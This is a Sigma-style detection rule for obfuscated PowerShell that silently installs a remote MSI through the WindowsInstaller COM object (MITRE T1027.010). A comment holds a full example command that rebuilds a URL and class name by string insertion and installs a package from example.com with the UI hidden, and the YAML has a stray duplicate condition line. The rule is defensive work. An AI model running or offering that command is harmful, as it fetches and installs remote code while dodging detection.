title: Obfuscated PowerShell MSI Install via WindowsInstaller COM
id: 4a67b7f3-b45f-41ea-9844-1528ffad8eb6
status: experimental
description: |
  Detection for MITRE ATT&CK technique T1027.010.
  Original source: sigma
references:
  - https://attack.mitre.org/techniques/T1027/010/
  - https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_comobject_msi.yml
author: GapMATRIX (sourced from sigma)
date: 2026-01-28
tags:
  - attack.t1027.010
logsource:
  product: windows
  service: security
  category: process_creation
detection:
      # Example: "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -W Hidden -C "$u='htps://example.com/';$i=New-Object -ComObject('indowsInstaller.Installer'.Insert(0,'W'));$i.UILevel=2;$i.InstallProduct($(if($u.StartsWith('htps://')){$u.Insert(2,'t')}else{$u}),'')";
      selection_img:
          - Image|endswith:
                - '\powershell_ise.exe'
                - '\powershell.exe'
                - '\pwsh.exe'
          - OriginalFileName:
                - 'PowerShell_ISE.EXE'
                - 'PowerShell.EXE'
                - 'pwsh.dll'
      selection_cli:
          CommandLine|contains|all:
              - '-ComObject'
              - 'InstallProduct('
              - '.Insert('
              - 'UILevel'
      condition: all of selection_*
  
  condition: selection
falsepositives:
  - Legitimate administrative activity
level: medium
